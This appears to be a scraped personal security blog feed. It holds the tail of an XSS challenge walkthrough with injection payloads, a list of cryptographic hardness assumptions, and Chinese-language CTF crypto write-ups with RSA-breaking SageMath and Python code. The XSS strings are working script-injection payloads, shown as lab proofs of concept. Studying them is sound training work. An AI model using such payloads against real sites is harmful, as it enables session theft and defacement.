<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>No filtration. Just bypass. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1);</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x10.png" class="" title="0x10">



<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p><strong><code>//</code>is escaped, but it still runs at <code>//</code> in fact.</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x11.png" class="" title="0x11">



<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><ul>
<li><strong>Escape the escape character.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;); alert(1); //</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x12-1.png" class="" title="0x12-1">



<ul>
<li><strong>Embed label inline.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/30/22-12-30-XSS/0x12-2.png" class="" title="0x12-2">
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>penetration</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Description-About-Common-Difficult-Problems-in-Cryptography</title>
    <url>/2023/03/02/Description-about-common-difficult-problems-in-cryptography/</url>
    <content><![CDATA[<p>Descriptions about the common difficult problems in cryptography.</p>
<p>I will learn about them in the nearly future. </p>
<span id="more"></span><!--toc-->



<blockquote>
<p><a href="https://web.archive.org/web/20120121090326/http://www.ecrypt.eu.org/wiki/index.php/Main_Page">web.archive.org</a></p>
</blockquote>
<h1 id="Discrete-logarithm-problem"><a href="#Discrete-logarithm-problem" class="headerlink" title="Discrete logarithm problem"></a>Discrete logarithm problem</h1><ul>
<li>DLP: discrete logarithm problem</li>
<li>CDH: computational Diffie-Hellman problem</li>
<li>SDH: static Diffie-Hellman problem</li>
<li>gap-CDH: Gap Diffie-Hellman problem</li>
<li>DDH: decision Diffie-Hellman problem</li>
<li>Strong-DDH: strong decision Diffie-Hellman problem</li>
<li>sDDH: skewed decision Diffie-Hellman problem</li>
<li>PDDH: parallel decision Diffie-Hellman problem</li>
<li>Square-DH: Square Diffie-Hellman problem</li>
<li>l-DHI: l-Diffie-Hellman inversion problem</li>
<li>l-DDHI: l-Decisional Diffie-Hellman inversion problem</li>
<li>REPRESENTATION: Representation problem</li>
<li>LRSW: LRSW Problem</li>
<li>Linear: Linear problem</li>
<li>D-Linear1: Decision Linear problem (version 1)</li>
<li>l-SDH: l-Strong Diffie-Hellman problem</li>
<li>c-DLSE: Discrete Logarithm with Short Exponents</li>
<li>CONF: (conference-key sharing scheme)</li>
<li>3PASS: 3-Pass Message Transmission Scheme</li>
<li>LUCAS: Lucas Problem</li>
<li>XLP: x-Logarithm Problem</li>
<li>MDHP: Matching Diffie-Hellman Problem</li>
<li>DDLP: Double Discrete Logarithm Problem</li>
<li>rootDLP: Root of Discrete Logarithm Problem</li>
<li>n-M-DDH: Multiple Decision Diffie-Hellman Problem</li>
<li>l-HENSEL-DLP: l-Hensel Discrete Logarithm Problem</li>
<li>DLP(Inn(G)): Discrete Logarithm Problem over Inner Automorphism Group</li>
<li>IE: Inverse Exponent</li>
<li>TDH: The Twin Diffie-Hellman Assumption</li>
<li>XTR-DL: XTR discrete logarithm problem</li>
<li>XTR-DH: XTR Diffie-Hellman problem</li>
<li>XTR-DHD: XTR decision Diffie-Hellman problem</li>
<li>CL-DLP: discrete logarithms in class groups of imaginary quadratic orders</li>
<li>TV-DDH: Tzeng Variant Decision Diffie-Hellman problem</li>
<li>n-DHE: n-Diffie-Hellman Exponent problem</li>
</ul>
<h1 id="Factoring"><a href="#Factoring" class="headerlink" title="Factoring"></a>Factoring</h1><ul>
<li>FACTORING: integer factorisation problem</li>
<li>SQRT: square roots modulo a composite</li>
<li>CHARACTERd: character problem</li>
<li>MOVAd: character problem</li>
<li>CYCLOFACTd: factorisation in Z[θ]</li>
<li>FERMATd: factorisation in Z[θ]</li>
<li>RSAP: RSA problem</li>
<li>Strong-RSAP: strong RSA problem</li>
<li>Difference-RSAP: Difference RSA problem</li>
<li>Partial-DL-ZN2P: Partial Discrete Logarithm problem in Z∗n</li>
<li>DDH-ZN2P: Decision Diffie-Hellman problem over Z∗n</li>
<li>Lift-DH-ZN2P: Lift Diffie-Hellman problem over Z∗n</li>
<li>EPHP: Election Privacy Homomorphism problem</li>
<li>AERP: Approximate e-th root problem l-HENSEL-RSAP: l-Hensel RSA</li>
<li>DSeRP: Decisional Small e-Residues in Z∗n2</li>
<li>DS2eRP: Decisional Small 2e-Residues in Z∗n2</li>
<li>DSmallRSAKP: Decisional Reciprocal RSA-Paillier in Z∗n2 HRP: Higher Residuosity Problem</li>
<li>ECSQRT: Square roots in elliptic curve groups over Z&#x2F;nZ</li>
<li>RFP: Root Finding Problem</li>
<li>phiA: PHI-Assumption</li>
<li>C-DRSA: Computational Dependent-RSA problem</li>
<li>D-DRSA: Decisional Dependent-RSA problem</li>
<li>E-DRSA: Extraction Dependent-RSA problem</li>
<li>DCR: Decisional Composite Residuosity problem</li>
<li>CRC: Composite Residuosity Class problem</li>
<li>DCRC: Decisional Composite Residuosity Class problem</li>
<li>GenBBS: generalised Blum-Blum-Shub assumption</li>
</ul>
<h1 id="Product-groups"><a href="#Product-groups" class="headerlink" title="Product groups"></a>Product groups</h1><ul>
<li>co-CDH: co-Computational Diffie-Hellman Problem</li>
<li>PG-CDH: Computational Diffie-Hellman Problem for Product Groups</li>
<li>XDDH: External Decision Diffie-Hellman Problem</li>
<li>D-Linear2: Decision Linear Problem (version 2)</li>
<li>PG-DLIN: Decision Linear Problem for Product Groups</li>
<li>FSDH: Flexible Square Diffie-Hellman Problem</li>
<li>KSW1: Assumption 1 of Katz-Sahai-Waters</li>
</ul>
<h1 id="Pairings"><a href="#Pairings" class="headerlink" title="Pairings"></a>Pairings</h1><ul>
<li>BDHP: Bilinear Diffie-Hellman Problem</li>
<li>DBDH: Decision Bilinear Diffie-Hellman Problem</li>
<li>B-DLIN: Bilinear Decision-Linear Problem</li>
<li>l-BDHI: l-Bilinear Diffie-Hellman Inversion Problem</li>
<li>l-DBDHI: l-Bilinear Decision Diffie-Hellman Inversion Problem</li>
<li>l-wBDHI: l-weak Bilinear Diffie-Hellman Inversion  Problem</li>
<li>l-wDBDHI: l-weak Decisional Bilinear Diffie-Hellman Inversion Problem</li>
<li>KSW2: Assumption 2 of Katz-Sahai-Waters</li>
<li>MSEDH: Multi-sequence of Exponents Diffie-Hellman Assumption</li>
</ul>
<h1 id="Lattices"><a href="#Lattices" class="headerlink" title="Lattices"></a>Lattices</h1><h2 id="Main-Lattice-Problems"><a href="#Main-Lattice-Problems" class="headerlink" title="Main Lattice Problems"></a>Main Lattice Problems</h2><ul>
<li>SVPγp: (Approximate) Shortest vector problem</li>
<li>CVPpγ: (Approximate) Closest vector problem</li>
<li>GapSVPpγ: Decisional shortest vector problem</li>
<li>GapCVPpγ: Decisional closest vector problem</li>
</ul>
<h2 id="Modular-Lattice-Problems"><a href="#Modular-Lattice-Problems" class="headerlink" title="Modular Lattice Problems"></a>Modular Lattice Problems</h2><ul>
<li>SISp(n,m,q,β): Short integer solution problem</li>
<li>ISISp(n,m,q,β): Inhomogeneous short integer solution problem</li>
<li>LWE(n,q,φ): Learning with errors problem</li>
</ul>
<h2 id="Miscellaneous-Lattice-Problems"><a href="#Miscellaneous-Lattice-Problems" class="headerlink" title="Miscellaneous Lattice Problems"></a>Miscellaneous Lattice Problems</h2><ul>
<li>USVPp(n,γ): Approximate unique shortest vector problem</li>
<li>SBPp(n,γ): Approximate shortest basis problem</li>
<li>SLPp(n,γ): Approximate shortest length problem</li>
<li>SIVPp(n,γ): Approximate shortest independent vector problem</li>
<li>hermiteSVP: Hermite shortest vector problem</li>
<li>CRP: Covering radius problem</li>
</ul>
<h2 id="Ideal-Lattice-Problems"><a href="#Ideal-Lattice-Problems" class="headerlink" title="Ideal Lattice Problems"></a>Ideal Lattice Problems</h2><ul>
<li>Ideal-SVPf,pγ: (Approximate) Ideal shortest vector problem &#x2F; Shortest polynomial problem</li>
<li>Ideal-SISf,p q,m,β: Ideal small integer solution problem</li>
</ul>
<h1 id="Miscellaneous-Problems"><a href="#Miscellaneous-Problems" class="headerlink" title="Miscellaneous Problems"></a>Miscellaneous Problems</h1><ul>
<li>KEA1: Knowledge of Exponent assumption</li>
<li>MQ: Multivariable Quadratic equations</li>
<li>CF: Given-weight codeword finding</li>
<li>ConjSP: Braid group conjugacy search problem</li>
<li>GenConjSP: Generalised braid group conjugacy search problem</li>
<li>ConjDecomP: Braid group conjugacy decomposition problem</li>
<li>ConjDP: Braid group conjugacy decision problem</li>
<li>DHCP: Braid group decisional Diffie-Hellman-type conjugacy problem</li>
<li>ConjSearch: (multiple simlutaneous) Braid group conjugacy search problem</li>
<li>SubConjSearch: subgroup restricted Braid group conjugacy search problem</li>
<li>LINPOLY : A linear algebra problem on polynomials<br>HFE-DP: Hidden Field Equations Decomposition Problem</li>
<li>HFE-SP: Hidden Field Equations Solving Problem</li>
<li>MKS: Multiplicative Knapsack</li>
<li>BP: Balance Problem</li>
<li>AHA: Adaptive Hardness Assumptions</li>
<li>SPI: Sparse Polynomial Interpolation</li>
<li>SPP: Self-Power Problem</li>
<li>VDP: Vector Decomposition Problem</li>
<li>2-DL: 2-generalized Discrete Logarithm Problem</li>
</ul>
<h1 id="Problem-Details"><a href="#Problem-Details" class="headerlink" title="Problem Details"></a>Problem Details</h1><p>The full paper provides details about each assumption. Here is an example entry:</p>
<h2 id="CDH-computational-Diffie-Hellman-problem"><a href="#CDH-computational-Diffie-Hellman-problem" class="headerlink" title="CDH: computational Diffie-Hellman problem"></a>CDH: computational Diffie-Hellman problem</h2><ul>
<li><p>Definition :<br>Given ga,gb∈G to compute gab.</p>
</li>
<li><p>Reductions:<br>CDH ≤p DLP<br>DLP ≤subexp CDH in groups of squarefree order.</p>
</li>
<li><p>Algorithms:<br>The best known algorithm for CDH is to actually solve the DLP.</p>
</li>
</ul>
<p>Use in cryptography: Diffie-Hellman key exchange and variants, Elgamal encryption and variants, BLS signatures and variants.</p>
<ul>
<li><p>History:<br>Discovered by W. Diffie and M. Hellman.</p>
</li>
<li><p>Remark:<br>A variant of CDH is: Given g0,ga0,gb0∈G to compute gab0. This is ≡p CDH.</p>
</li>
<li><p>References:</p>
<ul>
<li>W. Diffie and M. E. Hellman, New directions in cryptography, IEEE Transactions on Information Theory, vol. IT-22, No. 6, Nov. 1976, p. 644-654</li>
<li>U.M. Maurer and S. Wolf, Diffie-Hellman Oracles, 	Proceedings of CRYPTO ’96, p. 268-282.</li>
<li>D. Boneh and R.J. Lipton Algorithms for Black-Box Fields and Applications to Cryp- tography, Proceedings of CRYPTO ’96, p. 283-297.</li>
<li>The complete text is far too long to copy paste here, but this provides a pretty good example of how extensive and thorough it is.</li>
</ul>
</li>
</ul>
<h1 id="Addendum-Unlisted-Problem-s"><a href="#Addendum-Unlisted-Problem-s" class="headerlink" title="Addendum: Unlisted Problem(s)"></a>Addendum: Unlisted Problem(s)</h1><p>The following problem(s) were not listed in the above - - </p>
<ul>
<li>reference:<ul>
<li>MIHNP: Modular Inversion Hidden Number Problem</li>
<li>AGCD: Approximate Greatest Common Divisor</li>
<li>SIP: Small Inverse Problem</li>
</ul>
</li>
</ul>
<h2 id="Subset-Sum-x2F-Knapsack-problem"><a href="#Subset-Sum-x2F-Knapsack-problem" class="headerlink" title="Subset Sum&#x2F;Knapsack problem"></a>Subset Sum&#x2F;Knapsack problem</h2><ul>
<li>Subset Sum problem<ul>
<li>(0,1) knapsack problem (The standard version of the problem)</li>
</ul>
</li>
<li>Bounded knapsack problem<br>Unbounded knapsack problem</li>
<li>RMSS: Random Modular Subset Sum</li>
</ul>
<h2 id="Note-about-parameters"><a href="#Note-about-parameters" class="headerlink" title="Note about parameters"></a>Note about parameters</h2><p>Hardness assumptions only hold when parameterized correctly. Inappropriate parameters can lead to easily solved instances of hard problems.</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>definition</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Write-Up-Zh</title>
    <url>/2023/03/09/Crypto-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<p>Timelines are <strong>from new to old</strong>.</p>
<span id="more"></span><!--toc-->

<h1 id="DASCTF-2023-amp-0X401-ezAlgebra"><a href="#DASCTF-2023-amp-0X401-ezAlgebra" class="headerlink" title="[DASCTF 2023 &amp; 0X401]ezAlgebra"></a>[DASCTF 2023 &amp; 0X401]ezAlgebra</h1><ul>
<li>Coppersmith-已知高位攻击</li>
<li>方程组求解-groebner_basis()</li>
</ul>
<p>$$<br>n &#x3D; p\times q\times r<br>$$</p>
<p>$$<br>c_1 \equiv (t+p)^{4} + (t+p)^{3} + (t+p)^{2} + (t+p) + 1997 \mod n<br>$$</p>
<p>$$<br>c_2 \equiv (mt)^{19} + (mt)^{18} + \cdots +(mt)^{2} + (mt) + 1997 \mod q<br>$$</p>
<p>$$<br>c_3 \equiv (m+t)^{19} + (m+t)^{18}+\cdots + (m+t)^{2} + (m+t) + 1997 \mod q<br>$$</p>
<p>因为$\mod n \rightarrow \mod q $，所以对公式进行变形可以得到：<br>$$<br>\Longrightarrow kp &#x3D; c_1 - (t^{4} + t^{3} + t^{2} + t + 1997)<br>$$</p>
<h2 id="Coppersmith-已知高位攻击"><a href="#Coppersmith-已知高位攻击" class="headerlink" title="Coppersmith-已知高位攻击"></a>Coppersmith-已知高位攻击</h2><p>此处我们假设$(t + p)$为未知数，利用多项式环进行求解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x^4 + x^3 + x^2 + x + 1997 - c1</span><br><span class="line">t = f.small_roots(X = 2 ^ 32, beta = 0.4)[0]</span><br><span class="line"># print(t)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>small_roots(X, beta)</code></p>
<ul>
<li><code>X</code>为该式的需要求解根的上限；虽然是根的上限，并不是说上限越高越好，当上限超过某个值的时候就会计算失效，即使已知二进制位数满足条件，也无法用此函数求得结果；所以一般来说<code>X</code>取在给定情况下的最大求解上限。</li>
<li><code>beta</code>，当p,q二进制位数相同时一般只能取$0.4$；如果p,q二进制位数不同，就按照之前的方法具体问题具体分析。$p,q \ge n^{\beta}$</li>
</ul>
</li>
<li><p>经过测试得到，当未知量小于等于$454bits$时（$p$,$q$为$1024bits$），coppersmith定理可以求解。</p>
</li>
</ul>
<p>$$<br>gcd(kp, n) &#x3D; p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kp = t^<span class="number">4</span> + t^<span class="number">3</span> + t^<span class="number">2</span> + t + <span class="number">1997</span> - c1</span><br><span class="line">p = gcd(mpz(kp), mpz(n))</span><br><span class="line">qr = n // p</span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br></pre></td></tr></table></figure>

<p>此时，利用倍数关系，直接把$p$利用<code>gcd()</code>函数进行求解。</p>
<h2 id="方程组求解-groebner-basis"><a href="#方程组求解-groebner-basis" class="headerlink" title="方程组求解-groebner_basis()"></a>方程组求解-groebner_basis()</h2><p>同样的操作，设置未知数。</p>
<p>利用<code>groebner_basis()</code>函数进行求解，此时必须三个方程才能求解对应未知量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P.&lt;x, t&gt; = PolynomialRing(Zmod(qr))</span><br><span class="line">f1 = t - 2915836867</span><br><span class="line">f2 = 1997 - c2</span><br><span class="line">f3 = 1997 - c3</span><br><span class="line">for i in range(1, 20):</span><br><span class="line">    f2 += (x * t) ^ i</span><br><span class="line">    f3 += (x + t) ^ i</span><br><span class="line">G = [f1, f2, f3]</span><br><span class="line">I = Ideal(G)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">print(B)</span><br><span class="line">res = [i.constant_coefficient() for i in B]</span><br><span class="line">print(res)</span><br><span class="line">q = int(res[2])</span><br><span class="line">m = int(-res[0] % q)</span><br><span class="line">tt = -res[1] % q</span><br><span class="line">print(q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>求出m转字符，发现得不到结果，结果是m % q，猜测比q大，爆破一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000000</span>):</span><br><span class="line">    v = long_to_bytes(m + i * q)</span><br><span class="line">    <span class="comment"># if b&#x27;ctf&#x27; in v:</span></span><br><span class="line">    <span class="comment">#     print(v)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= k &lt; <span class="number">0x7f</span> <span class="keyword">for</span> k <span class="keyword">in</span> v):</span><br><span class="line">        <span class="built_in">print</span>(v,i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h1 id="DASCTF-2023-amp-0X401-ezRSA"><a href="#DASCTF-2023-amp-0X401-ezRSA" class="headerlink" title="[DASCTF 2023 &amp; 0X401]ezRSA"></a>[DASCTF 2023 &amp; 0X401]ezRSA</h1><ul>
<li>coppersmith-已知高位求解p</li>
<li>Franklin Reiter 相关信息攻击</li>
</ul>
<h2 id="coppersmith-已知高位求解p"><a href="#coppersmith-已知高位求解p" class="headerlink" title="coppersmith-已知高位求解p"></a>coppersmith-已知高位求解p</h2><p>$$<br>gift &#x3D; P (Q &gt;&gt; 16)<br>$$</p>
<p>$$<br>c_1 &#x3D; pow(n, e, N) \equiv n^{e} \mod N<br>$$</p>
<p>$$<br>c_2 &#x3D; pow(secret, e, N) \equiv secret^{e} \mod N<br>$$</p>
<p>$$<br>c_3 &#x3D; pow(flag, e, n) \equiv flag^{e} \mod N<br>$$</p>
<p>*已知，$N$,$gift$,$c_1$,$c_2$,$c_3$*，求解<code>flag</code>。</p>
<p>只能从gift入手，P高16位已知，又N &#x3D; P * Q ，那么Q的高位也能得出，考虑到进位问题，可以将Q的高位位数求小一点（假设为x），之后再根据Q的高位和异或性质，又能求出P的高16 + x位，这里取x &#x3D; 10，如此循环往复，最后大概剩6比特没恢复，枚举下即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">P_h = gift &gt;&gt; (512 - 16)</span><br><span class="line"></span><br><span class="line"># def find_p(p, q, q_):</span><br><span class="line">#     if len(p) == (512 - 16):</span><br><span class="line">#         pp = int(p, 2) + P_h * 2 ** (512 - 16)</span><br><span class="line">#         if gcd(N, pp) &gt; 1:</span><br><span class="line">#             print(pp)</span><br><span class="line">#             print(N//pp)</span><br><span class="line">#         else:</span><br><span class="line">#             l = len(p)</span><br><span class="line">#             pp = int(p, 2)</span><br><span class="line">#             qq = int(q, 2)</span><br><span class="line">#             if (pp ^ qq) % (2 ** l) == gift % (2 ** l) and pp*(qq * 2 ** 16 + q_) % (2 ** l) == N % (2 ** l):</span><br><span class="line">#                 find_p(&#x27;1&#x27; + p, &#x27;1&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;1&#x27; + p, &#x27;0&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;0&#x27; + p, &#x27;1&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;0&#x27; + p, &#x27;0&#x27; + q, q_)</span><br><span class="line"># for q_ in range(2 ** 16):</span><br><span class="line">#     find_p(&#x27;1&#x27;, &#x27;1&#x27;, q_)</span><br><span class="line"></span><br><span class="line"># while True:</span><br><span class="line">#     try:</span><br><span class="line">#         Q_h = (N &gt;&gt; (1024 - P_h.bit_length() * 2)) // P_h</span><br><span class="line">#         print(Q_h, Q_h.bit_length())</span><br><span class="line">#         Q_h = Q_h &gt;&gt; 6</span><br><span class="line">#         gifts = gift ^ (Q_h &lt;&lt; (512 - 16 - Q_h.bit_length()))</span><br><span class="line">#         P_h = gifts &gt;&gt; (512 - 16 - Q_h.bit_length())</span><br><span class="line">#         print(P_h, P_h.bit_length())</span><br><span class="line">#     except:</span><br><span class="line">#         break</span><br><span class="line"></span><br><span class="line"># for i in range(64):</span><br><span class="line">#     P = (P_h &lt;&lt; 6) + i</span><br><span class="line">#     if N % P == 0:</span><br><span class="line">#         print(P)</span><br><span class="line">#         break</span><br><span class="line"></span><br><span class="line">ph = bin(gift)[2:][:16] + &#x27;0&#x27;*(512-16)</span><br><span class="line">ph = int(ph,2)</span><br><span class="line">x = bin(gift)[2:][17:]</span><br><span class="line"> </span><br><span class="line">def fac(x,tp,tq):</span><br><span class="line">    if len(x) == 0:</span><br><span class="line">        return</span><br><span class="line">    if tp*tq&gt;N:</span><br><span class="line">        return </span><br><span class="line">    if N%(tp+1)==0:</span><br><span class="line">        print(tp+1)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    v = x[0]</span><br><span class="line">    r = x[1:]</span><br><span class="line">    l = len(r)</span><br><span class="line">    </span><br><span class="line">    if (tp+(1&lt;&lt;(l+1)))*(tq+(1&lt;&lt;(l+17)))&lt;N:</span><br><span class="line">        print(bin(tp)[:50])</span><br><span class="line">        print(bin(tq)[:50])</span><br><span class="line">        print(l)</span><br><span class="line">        return</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    if v == &#x27;0&#x27;:</span><br><span class="line">       fac(r, tp, tq)</span><br><span class="line">       fac(r, tp+(1&lt;&lt;l), tq+(1&lt;&lt;(l+16)))</span><br><span class="line">    else:</span><br><span class="line">       fac(r, tp+(1&lt;&lt;l), tq)</span><br><span class="line">       fac(r, tp, tq+(1&lt;&lt;(l+16)))</span><br><span class="line"> </span><br><span class="line">#q第1位为1 x[0]==&#x27;0&#x27;</span><br><span class="line">tq = 1&lt;&lt;511</span><br><span class="line">tp = ph + (1&lt;&lt;(512-16-1))</span><br><span class="line"> </span><br><span class="line">fac(x,tp,tq)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/Crypto-Write-Up-zh/image-20230802172550696.png" class="" title="image-20230802172550696">

<p>之后来到 <code>flag == b&quot;dasctf&#123;&quot; + secret + b&quot;&#125;&quot;</code>这一步。</p>
<p>已知bytes转long型相当于256进制，假设secret的长度为i，那么。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c2 = x ^ 11 </span><br><span class="line">c3 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;\00&#x27; * i + b&#x27;&#125;&#x27; ) * 256 ** (i + 1) + 256 * x) ^ 11</span><br><span class="line">(其中x = secret , i = len(secret))</span><br></pre></td></tr></table></figure>

<h2 id="Franklin-Reiter-相关信息攻击"><a href="#Franklin-Reiter-相关信息攻击" class="headerlink" title="Franklin Reiter 相关信息攻击"></a>Franklin Reiter 相关信息攻击</h2><p>把$n$先确定下来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P = 8006847171912577069085166877758626954304824756138758266557706391662987806065132448544117840031499707938227955094109779732609035310252723066470330862622641</span><br><span class="line">Q = N // P</span><br><span class="line">n = powmod(c1, int(invert(e, (P - 1) * (Q - 1))), N)</span><br><span class="line"># n = n + N</span><br><span class="line"># print(n)</span><br><span class="line">k = 0</span><br><span class="line">while True:</span><br><span class="line">    n = n + k * N</span><br><span class="line">    if n % 2 == 1:</span><br><span class="line">        print(n)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        k += 1</span><br></pre></td></tr></table></figure>

<p>相关信息攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># c2 = x ^ 11</span><br><span class="line"># c3 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;00&#x27; * i + b&#x27;&#125;&#x27;) * 256 ** (i + 1) + 256 * x) ^ 11</span><br><span class="line"># x为secret， i = len(secret)</span><br><span class="line"></span><br><span class="line">def GCD(a,b):</span><br><span class="line">    if b == 0:</span><br><span class="line">        return a.monic()</span><br><span class="line">    else:</span><br><span class="line">        return GCD(b,a % b)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">for i in range(50):</span><br><span class="line">    f1 = x ^ 11 - c2</span><br><span class="line">    f2 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;\x00&#x27; * i + b&#x27;&#125;&#x27;) + 256 * x) ^ 11 - c3</span><br><span class="line">    if GCD(f1,f2)[0] != 1:</span><br><span class="line">        secret = long_to_bytes(int(n - int(GCD(f1,f2)[0])))</span><br><span class="line">        flag = b&#x27;dasctf&#123;&#x27; + secret + b&#x27;&#125;&#x27;</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="宁波天一杯-rsa"><a href="#宁波天一杯-rsa" class="headerlink" title="[宁波天一杯]rsa"></a>[宁波天一杯]rsa</h1><ul>
<li>构造满足条件的$f$，进行根的求解</li>
<li>Pollard_rho 算法</li>
<li>方程化简，模数分解</li>
<li>Relating: 羊城杯2021-easy_rsa</li>
</ul>
<h2 id="法1——构造-f"><a href="#法1——构造-f" class="headerlink" title="法1——构造$f$"></a>法1——构造$f$</h2><blockquote>
<p>构造$f &#x3D; 2 \cdot g \cdot x + 1$ 在模$n$情况下有解。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = Zmod(n)[]</span><br><span class="line">f = 2 * a * x + 1</span><br><span class="line">g = int(f.monic().small_roots(X=2^51, beta=0.4)[0])</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br></pre></td></tr></table></figure>

<h2 id="法2——pollard’s-rho"><a href="#法2——pollard’s-rho" class="headerlink" title="法2——pollard’s rho"></a>法2——pollard’s rho</h2><blockquote>
<p>$p - 1$以及$q - 1$存在较大公因数，Pollard’s rho 分解n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="comment"># print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i))</span></span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>)*(q - <span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h2 id="法3——非预期"><a href="#法3——非预期" class="headerlink" title="法3——非预期"></a>法3——非预期</h2><blockquote>
<p>神奇非预期</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = invert(e, a - <span class="number">1</span>)</span><br><span class="line">m = powmod(c, d, a)</span><br></pre></td></tr></table></figure>

<h2 id="法4——化简进行分解"><a href="#法4——化简进行分解" class="headerlink" title="法4——化简进行分解"></a>法4——化简进行分解</h2><blockquote>
<p>直接利用等式进行分解，化简可得$p\cdot q - 1 &#x3D; 2gh$，g为51bit，h约为972bit，两者相差非常大，利用factordb&#x2F;yafu进行分解</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gh = (n - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"><span class="comment"># print(gh)</span></span><br><span class="line">h = <span class="number">13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679</span></span><br><span class="line">g = <span class="number">1346104232461691</span></span><br><span class="line">phi = (a - <span class="number">1</span>) * (g - <span class="number">1</span>)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br></pre></td></tr></table></figure>



